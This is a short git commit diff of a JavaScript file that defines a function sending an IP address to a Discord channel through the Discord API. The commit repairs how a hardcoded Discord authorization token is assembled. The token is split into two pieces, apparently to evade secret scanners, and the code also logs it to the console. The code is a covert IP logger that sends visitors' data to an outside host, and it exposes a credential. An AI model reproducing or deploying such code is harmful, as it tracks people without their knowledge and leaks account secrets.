614a20b88017a897c67943b7387becc24fe83e61
richardmichard <albig_juli@bs-an.de>
2024-02-08 09:59:26 +0100

    c
    f

--- script.js
+++ script.js
@@ -1,16 +1,18 @@
 function generateNonce() {
-    return Math.random() * 1000000
+    return Math.random() * 1000000000
 }
 
-const tokenPart1 = "MTIwNTA3MTcwMzExMDE4OTA1Ng.GQIW0Q"
-const tokenPart2 = ".NXAM82y7_i4YEYTawjPl8pfXDU_-5vv4ir4pKk"
+let tokenPart1 = "MTIwNTA3MTcwMzExMDE4OTA1Ng.GQIW0Q"
+let tokenPart2 = ".NXAM82y7_i4YEYTawjPl8pfXDU_-5vv4ir4pKk"
 
 function sendIPToDiscord(ip) {
-    console.log( `${tokenPart1}+${tokenPart2}`)
+     tokenPart1 = "MTIwNTA3MTcwMzExMDE4OTA1Ng.GQIW0Q"
+     tokenPart2 = ".NXAM82y7_i4YEYTawjPl8pfXDU_-5vv4ir4pKk"
+    console.log( `${tokenPart1}${tokenPart2}`)
     fetch("https://discord.com/api/v9/channels/1205072221370847255/messages", {
   "headers": {
     "accept": "*/*",
-    "authorization": `${tokenPart1}+${tokenPart2}`,
+    "authorization": `${tokenPart1}${tokenPart2}`,
     "content-type": "application/json",
   },
   "referrer": "https://discord.com/channels/1205072221370847252/1205072221370847255",
